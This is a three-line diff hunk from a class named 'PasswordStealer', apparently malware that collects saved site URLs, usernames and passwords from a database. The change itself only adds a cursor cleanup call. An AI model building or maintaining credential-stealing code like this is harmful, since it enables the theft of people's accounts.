@@ -69,3 +69,4 @@ class PasswordStealer:
                 self.credentials.append((origin_url, username, password))
 
             db.close()
+            cursor.close()
